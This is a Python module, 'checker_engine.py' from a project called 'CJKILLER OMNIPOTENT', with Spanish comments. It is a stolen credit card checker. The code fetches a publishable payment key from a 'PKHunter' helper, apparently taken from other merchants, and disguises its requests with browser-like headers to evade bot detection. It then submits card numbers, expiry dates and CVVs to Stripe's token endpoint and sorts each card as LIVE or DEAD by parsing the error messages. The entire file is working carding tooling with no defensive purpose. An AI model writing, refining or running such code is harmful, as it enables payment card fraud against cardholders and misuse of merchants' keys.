# =================================================================
# PROJECT: CJKILLER OMNIPOTENT
# MODULE: checker_engine.py (ULTRA-MULTI-GATE)
# =================================================================

import requests
import json
from pk_hunter import PKHunter

class CCChecker:
    @staticmethod
    def check_gate_real(cc, mm, yy, cvv):
        """
        Punto de entrada principal. 
        Intenta verificar la tarjeta usando diferentes lógicas de respuesta.
        """
        # 1. Obtenemos una PK fresca si no hay una activa
        pk = PKHunter.get_fresh_pk()
        
        # 2. Configuración de la sesión técnica
        session = requests.Session()
        url = "https://api.stripe.com/v1/tokens"
        
        # Cabeceras de navegador real para evitar ser detectado como bot
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }

        # Datos formateados para Stripe
        payload = {
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'key': pk # Usamos la PK cazada automáticamente
        }

        try:
            # Enviamos la petición al Gateway
            response = session.post(url, headers=headers, data=payload, timeout=20)
            res_json = response.json()

            # --- LÓGICA DE DETECCIÓN DETALLADA ---
            
            # Caso A: Éxito (Token Creado)
            if "id" in res_json:
                return {
                    "status": "LIVE ✅", 
                    "msg": "Card Authorized (Token Generated)", 
                    "full_res": "Success",
                    "gate": "Stripe Auth"
                }
            
            # Caso B: Error analizado por el Banco/Gateway
            elif "error" in res_json:
                err = res_json['error']
                msg = err.get('message', 'Declined')
                code = err.get('code', 'generic_decline')

                # Filtrado de Lives por respuesta de error específica
                # Si el error es de fondos o CVV, la tarjeta es LIVE (CCN)
                if any(x in msg.lower() for x in ["insufficient funds", "card_velocity_exceeded", "incorrect_cvc"]):
                    return {
                        "status": "LIVE ✅", 
                        "msg": f"Live CCN ({msg})", 
                        "full_res": code,
                        "gate": "Stripe Auth"
                    }
                
                # Caso C: Tarjeta muerta confirmada
                return {
                    "status": "DEAD ❌", 
                    "msg": msg, 
                    "full_res": code,
                    "gate": "Stripe Auth"
                }

            return {"status": "UNK ❓", "msg": "Unexpected Response", "full_res": "Unknown", "gate": "Stripe Auth"}

        except requests.exceptions.Timeout:
            return {"status": "ERROR ⚠️", "msg": "Gateway Timeout", "full_res": "Timeout", "gate": "Stripe Auth"}
        except Exception as e:
            return {"status": "ERROR ⚠️", "msg": str(e)[:40], "full_res": "System Error", "gate": "Stripe Auth"}
